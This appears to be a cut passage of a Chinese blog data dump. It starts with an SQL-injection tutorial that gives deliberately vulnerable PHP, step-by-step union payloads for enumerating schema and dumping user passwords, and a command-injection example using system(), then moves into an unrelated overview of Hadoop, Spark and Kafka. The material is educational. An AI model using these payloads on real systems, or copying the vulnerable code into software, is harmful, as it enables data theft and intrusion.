class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\">$db_host = <span class=\"string\">\"localhost\"</span>;</span><br><span class=\"line\">$db_user = <span class=\"string\">\"my_user\"</span>;</span><br><span class=\"line\">$db_password = <span class=\"string\">\"my_password\"</span>;</span><br><span class=\"line\">$db_name = <span class=\"string\">\"my_db\"</span>;</span><br><span class=\"line\">$conn = mysqli_connect($db_host,$db_user,$db_password,$db_name);</span><br><span class=\"line\"></span><br><span class=\"line\">$user = $_POST[ <span class=\"string\">'username'</span> ];</span><br><span class=\"line\"></span><br><span class=\"line\">$pass = $_POST[ <span class=\"string\">'password'</span> ];</span><br><span class=\"line\">$user = mysqli_real_escape_string($conn, $user);</span><br><span class=\"line\">$pass = mysqli_real_escape_string($conn, $pass);</span><br><span class=\"line\">$pass = md5( $pass );</span><br><span class=\"line\"></span><br><span class=\"line\">$query  = <span class=\"string\">\"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';\"</span>;</span><br><span class=\"line\">$result = mysqli_query($conn, $query);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( $result &amp;&amp; mysqli_num_rows( $result ) == <span class=\"number\">1</span> ) &#123;</span><br><span class=\"line\">\t$row    = mysqli_fetch_assoc( $result );</span><br><span class=\"line\">\t$avatar = $row[<span class=\"string\">\"avatar\"</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;\"</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;img src=\\\"&#123;$avatar&#125;\\\" /&gt;\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">mysqli_close($conn);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p><code>sql.php</code><br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">    &lt;head&gt;</span><br><span class=\"line\">        &lt;meta charset=<span class=\"string\">\"UTF-8\"</span>&gt;</span><br><span class=\"line\">        &lt;link rel=<span class=\"string\">\"stylesheet\"</span> href=<span class=\"string\">\"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css\"</span> integrity=<span class=\"string\">\"sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb\"</span> crossorigin=<span class=\"string\">\"anonymous\"</span>&gt;</span><br><span class=\"line\">        &lt;script src=<span class=\"string\">\"https://code.jquery.com/jquery-3.2.1.slim.min.js\"</span> integrity=<span class=\"string\">\"sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN\"</span> crossorigin=<span class=\"string\">\"anonymous\"</span>&gt;&lt;/script&gt;</span><br><span class=\"line\">        &lt;script src=<span class=\"string\">\"https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js\"</span> integrity=<span class=\"string\">\"sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh\"</span> crossorigin=<span class=\"string\">\"anonymous\"</span>&gt;&lt;/script&gt;</span><br><span class=\"line\">        &lt;script src=<span class=\"string\">\"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js\"</span> integrity=<span class=\"string\">\"sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ\"</span> crossorigin=<span class=\"string\">\"anonymous\"</span>&gt;&lt;/script&gt;</span><br><span class=\"line\">        &lt;title&gt;SQL 注入&lt;/title&gt;</span><br><span class=\"line\">    &lt;/head&gt;</span><br><span class=\"line\">    &lt;body&gt;</span><br><span class=\"line\">        <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> ($_POST[content]) &#123;</span><br><span class=\"line\">            $db_host = <span class=\"string\">\"localhost\"</span>;</span><br><span class=\"line\">\t\t\t$db_user = <span class=\"string\">\"my_user\"</span>;</span><br><span class=\"line\">\t\t\t$db_password = <span class=\"string\">\"my_password\"</span>;</span><br><span class=\"line\">\t\t\t$db_name = <span class=\"string\">\"my_db\"</span>;</span><br><span class=\"line\">            $content = $_POST[content];</span><br><span class=\"line\">            $query = <span class=\"string\">\"SELECT first_name,last_name FROM users WHERE user_id = '$content'\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">            $conn = mysqli_connect($db_host,$db_user,$db_password,$db_name);</span><br><span class=\"line\">            $result = mysqli_query($conn, $query);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (mysqli_num_rows($result)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">while</span> ($row = mysqli_fetch_array($result)) &#123;</span><br><span class=\"line\">                \t$first = $row[<span class=\"string\">\"first_name\"</span>];</span><br><span class=\"line\">\t\t\t$last  = $row[<span class=\"string\">\"last_name\"</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;\"</span>; </span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"string\">\"No Found!\"</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            mysqli_close($conn);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            var_dump($_POST);</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"Don't get your content!\"</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"meta\">?&gt;</span></span><br><span class=\"line\">    &lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>\n<p><code>user.html</code><br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"UTF-8\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css\"</span> <span class=\"attr\">integrity</span>=<span class=\"string\">\"sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb\"</span> <span class=\"attr\">crossorigin</span>=<span class=\"string\">\"anonymous\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"https://code.jquery.com/jquery-3.2.1.slim.min.js\"</span> <span class=\"attr\">integrity</span>=<span class=\"string\">\"sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN\"</span> <span class=\"attr\">crossorigin</span>=<span class=\"string\">\"anonymous\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js\"</span> <span class=\"attr\">integrity</span>=<span class=\"string\">\"sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh\"</span> <span class=\"attr\">crossorigin</span>=<span class=\"string\">\"anonymous\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js\"</span> <span class=\"attr\">integrity</span>=<span class=\"string\">\"sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ\"</span> <span class=\"attr\">crossorigin</span>=<span class=\"string\">\"anonymous\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"undefined\"></span><br><span class=\"line\">  \t\tdiv&#123;</span><br><span class=\"line\">\t\t    border:1px;</span><br><span class=\"line\">\t\t    width:400px;</span><br><span class=\"line\">\t\t    margin:20px auto;</span><br><span class=\"line\">\t\t  &#125;</span><br><span class=\"line\">\t</span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>sql 注入测试<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"card\"</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"card-body\"</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">h2</span>&gt;</span>Login<span class=\"tag\">&lt;/<span class=\"name\">h2</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">\"medium.php\"</span> <span class=\"attr\">method</span>=<span class=\"string\">\"POST\"</span>&gt;</span></span><br><span class=\"line\">\t\t\tUsername:<span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"form-control\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"username\"</span> <span class=\"attr\">placeholder</span>=<span class=\"string\">\"username\"</span>&gt;</span></span><br><span class=\"line\">\t\t\tPassword:<span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"password\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"form-control\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"password\"</span> <span class=\"attr\">placeholder</span>=<span class=\"string\">\"password\"</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">type</span>=<span class=\"string\">\"submit\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"btn btn-primary\"</span>&gt;</span>Login<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"初步注入\"><a href=\"#初步注入\" class=\"headerlink\" title=\"初步注入\"></a>初步注入</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1<span class=\"string\">' or '</span>1<span class=\"string\">'='</span>1</span><br></pre></td></tr></table></figure>\n<h3 id=\"猜测查询语句的字段数\"><a href=\"#猜测查询语句的字段数\" class=\"headerlink\" title=\"猜测查询语句的字段数\"></a>猜测查询语句的字段数</h3><p>即要对查询语句<br><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> first_name,last_name <span class=\"keyword\">FROM</span> <span class=\"keyword\">users</span> <span class=\"keyword\">WHERE</span> user_id = <span class=\"string\">'$content'</span></span><br></pre></td></tr></table></figure></p>\n<p>中的<code>SELECT</code>字段进行猜测<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1<span class=\"string\">' or 1=1 order by 1 #</span><br><span class=\"line\">1'</span> or 1=1 order by 2 <span class=\"comment\">#</span></span><br><span class=\"line\">1<span class=\"string\">' or 1=1 order by 3 #</span></span><br></pre></td></tr></table></figure></p>\n<p>尝试到3时出现<code>No Found</code>说明<code>SELECT</code>里有两个字段数</p>\n<h3 id=\"查询刚刚猜测的字段顺序\"><a href=\"#查询刚刚猜测的字段顺序\" class=\"headerlink\" title=\"查询刚刚猜测的字段顺序\"></a>查询刚刚猜测的字段顺序</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1<span class=\"string\">' union select 1,2 #</span></span><br></pre></td></tr></table></figure>\n<p><code>sql</code>语法<code>union</code>是将两个集合去重合并，相当于原本返回<code>admin,admin</code>，现在又存在<code>1,2</code>，通过<code>union</code>后就是两行数据</p>\n<h3 id=\"获取当前数据库名\"><a href=\"#获取当前数据库名\" class=\"headerlink\" title=\"获取当前数据库名\"></a>获取当前数据库名</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1<span class=\"string\">' union select 1,database() #</span></span><br></pre></td></tr></table></figure>\n<p><code>database()</code>是数据库系统信息函数，作用是获取当前数据库名，其他数据库信息函数有</p>\n<table>\n<thead>\n<tr>\n<th>函数</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>version()</td>\n<td>获取数据库的版本号</td>\n</tr>\n<tr>\n<td>connection_id()</td>\n<td>获取数据库的连接数</td>\n</tr>\n<tr>\n<td>database();schema()</td>\n<td>获取当前数据库名</td>\n</tr>\n<tr>\n<td>user();system_user()</td>\n<td>获取当前用户</td>\n</tr>\n<tr>\n<td>current_user()</td>\n<td>获取当前用户</td>\n</tr>\n<tr>\n<td>charset(str)</td>\n<td>获取字符串str的字符集</td>\n</tr>\n<tr>\n<td>collation(str)</td>\n<td>获取字符串str的字符排列方式</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"获取当前表名\"><a href=\"#获取当前表名\" class=\"headerlink\" title=\"获取当前表名\"></a>获取当前表名</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1<span class=\"string\">' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</span></span><br></pre></td></tr></table></figure>\n<p><code>mysql</code>在创建时默认创建一个information_schema数据库，在MySQL中，把 information_schema 看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权 限等。在INFORMATION_SCHEMA中，有数个只读表。它们实际上是视图，而不是基本表，因此，你将无法看到与之相关的任何文件。</p>\n<p><code>information_schema</code>数据库表说明:</p>\n<ul>\n<li><code>SCHEMATA</code>表：提供了当前mysql实例中所有数据库的信息。<code>show databases</code>的结果取之此表。</li>\n<li><code>TABLES</code>表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。<code>show tables from schemaname</code>的结果取之此表。</li>\n<li><code>COLUMNS</code>表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。<code>show columns from schemaname.tablename</code>的结果取之此表。</li>\n<li><code>STATISTICS</code>表：提供了关于表索引的信息。<code>show index from schemaname.tablename</code>的结果取之此表。</li>\n<li><code>USER_PRIVILEGES</code>（用户权限）表：给出了关于全程权限的信息。该信息源自mysql.user授权表。是非标准表。</li>\n<li><code>VIEWS</code>表：给出了关于数据库中的视图的信息。需要有<code>show views</code>权限，否则无法查看视图信息</li>\n<li><code>TRIGGERS</code>表：提供了关于触发程序的信息。必须有super权限才能查看该表</li>\n</ul>\n<h3 id=\"获取当前表字段名\"><a href=\"#获取当前表字段名\" class=\"headerlink\" title=\"获取当前表字段名\"></a>获取当前表字段名</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1<span class=\"string\">' union select 1,group_concat(column_name) from information_schema.columns where table_name='</span>users<span class=\"string\">' #</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"获取所有数据\"><a href=\"#获取所有数据\" class=\"headerlink\" title=\"获取所有数据\"></a>获取所有数据</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1<span class=\"string\">' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"视频\"><a href=\"#视频\" class=\"headerlink\" title=\"视频\"></a>视频</h3><div class=\"video-container\"><iframe src=\"//www.youtube.com/embed/UwJr-RsEy58\" frameborder=\"0\" allowfullscreen></iframe></div>\n<h2 id=\"php-注入\"><a href=\"#php-注入\" class=\"headerlink\" title=\"php 注入\"></a>php 注入</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"string\">\"查看文件\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"string\">\"&lt;p&gt;\"</span>);</span><br><span class=\"line\">$file=$_GET[<span class=\"string\">'filename'</span>];</span><br><span class=\"line\">system(<span class=\"string\">\"cat $file\"</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>与c代码注入类似，基本在于调用系统的命令来获取结果，诸如php获取系统版本、mysql版本、服务器时间、Web服务器类型等等系统信息，使用系统命令，都可能会产生注入漏洞。在本例中仍然可以在url中注入一些系统命令。</p>\n<h2 id=\"注入防范\"><a href=\"#注入防范\" class=\"headerlink\" title=\"注入防范\"></a>注入防范</h2><p>明白注入的基本方式和原理，很容易知道，通过输入检查来预防注入。获取到输入的字符串，对字符串进行过滤、转义等操作，只不过诸如php的不同输入检查函数，不同的函数的检查方法不一样，但有可能仍然存在编写者本身没有考虑到的可能性，这就导致了漏洞不间断出现。在使用这些检查函数时，要认真查看函数的检查方法以及过滤的东西。在此举个例子:</p>\n<p><code>mysqli_real_escape_string( mysqli $link , string $escapestr)</code>:</p>\n<ul>\n<li>Parameters:<ul>\n<li>link: Procedural style only: A link identifier returned by mysqli_connect() or mysqli_init()</li>\n<li>escapestr: The string to be escaped. Characters encoded are NUL (ASCII 0), \\n, \\r, \\, ‘, “, and Control-Z.</li>\n</ul>\n</li>\n<li>Return Value:<ul>\n<li>Returns an escaped string.</li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$mysqli = <span class=\"keyword\">new</span> mysqli(<span class=\"string\">\"localhost\"</span>, <span class=\"string\">\"my_user\"</span>, <span class=\"string\">\"my_password\"</span>, <span class=\"string\">\"world\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* check connection */</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (mysqli_connect_errno()) &#123;</span><br><span class=\"line\">    printf(<span class=\"string\">\"Connect failed: %s\\n\"</span>, mysqli_connect_error());</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$mysqli-&gt;query(<span class=\"string\">\"CREATE TEMPORARY TABLE myCity LIKE City\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">$city = <span class=\"string\">\"'s Hertogenbosch\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* this query will fail, cause we didn't escape $city */</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!$mysqli-&gt;query(<span class=\"string\">\"INSERT into myCity (Name) VALUES ('$city')\"</span>)) &#123;</span><br><span class=\"line\">    printf(<span class=\"string\">\"Error: %s\\n\"</span>, $mysqli-&gt;sqlstate);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$city = $mysqli-&gt;real_escape_string($city);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* this query with escaped $city will work */</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> ($mysqli-&gt;query(<span class=\"string\">\"INSERT into myCity (Name) VALUES ('$city')\"</span>)) &#123;</span><br><span class=\"line\">    printf(<span class=\"string\">\"%d Row inserted.\\n\"</span>, $mysqli-&gt;affected_rows);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$mysqli-&gt;close();</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"引用地址\"><a href=\"#引用地址\" class=\"headerlink\" title=\"引用地址\"></a>引用地址</h2><ul>\n<li><a href=\"http://www.freebuf.com/articles/web/120747.html\">http://www.freebuf.com/articles/web/120747.html</a></li>\n<li><a href=\"http://topspeedsnail.com/hack-command-injection-attack/\">http://topspeedsnail.com/hack-command-injection-attack/</a></li>\n</ul>"},{"title":"分布式计算","date":"2017-11-30T07:44:18.000Z","_content":"\n# 大数据知识图谱\n![](http://angelof7.github.io/album/bigdata.gif)\n\n<!--more-->\n# 分布式计算\n\n## 经典计算模型MapReduce\n[MapReduce论文](https://static.googleusercontent.com/media/research.google.com/en//archive/mapreduce-osdi04.pdf)\n[MapReduce编程](http://hadoop.apache.org/docs/r2.8.2/hadoop-mapreduce-client/hadoop-mapreduce-client-core/MapReduceTutorial.html)\n[基于 MapReduce 的并行计算框架](https://www.ibm.com/developerworks/cn/analytics/library/ba-1507-mapreducefiveframes/index.html)\n\n## 开源计算框架\n\n### hadoop\nApache Hadoop 是用于开发在分布式计算环境中执行的数据处理应用程序的框架。类似于在个人计算机系统的本地文件系统的数据，在 Hadoop 数据保存在被称为作为Hadoop分布式文件系统的分布式文件系统。处理模型是基于“数据局部性”的概念，其中的计算逻辑被发送到包含数据的集群节点(服务器)。这个计算逻辑不过是写在编译的高级语言程序，例如 Java. 这样的程序来处理Hadoop 存储 的 HDFS 数据。\nHadoop是一个开源软件框架。使用Hadoop构建的应用程序都分布在集群计算机商业大型数据集上运行。商业电脑便宜并广泛使用。这些主要是在低成本计算上实现更大的计算能力非常有用。计算机集群由一组多个处理单元(存储磁盘+处理器)，其被连接到彼此，并作为一个单一的系统。\n![](http://cdn.guru99.com/images/Big_Data/061114_0803_LearnHadoop4.png)\n\n[官网教程](http://hadoop.apache.org/docs/r2.8.2/)\n[中文文档](https://hadoop.apache.org/docs/r1.0.4/cn/quickstart.html)\n\n### spark\nSpark是基于内存计算的大数据并行计算框架.Spark基于内存计算，提高了在大数据环境下数据处理的实时性,同时保证了高容错性和高可伸缩性,允许用户将Spark部署在大量的廉价硬件之上,形成集群。\nSpark是MapReduce的替代方案，而且兼容HDFS、Hive等分布式存储层，可融入\nHadoop的生态系统，以弥补缺失MapReduce的不足\n![](http://upload-images.jianshu.io/upload_images/3661808-6dcd3a79aba8bbd7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n[官方良心文档](https://spark.apache.org/docs/latest/quick-start.html)\n[中文文档](http://spark.apachecn.org/docs/cn/2.2.0/quick-start.html)\n[编程指导](https://spark.apache.org/docs/latest/rdd-programming-guide.html)\n[流式编程](https://spark.apache.org/docs/latest/streaming-programming-guide.html)\n\n### kafka\nApache Kafka发源于LinkedIn，于2011年成为Apache的孵化项目，随后于2012年成为Apache的主要项目之一。Kafka使用Scala和Java进行编写。Apache 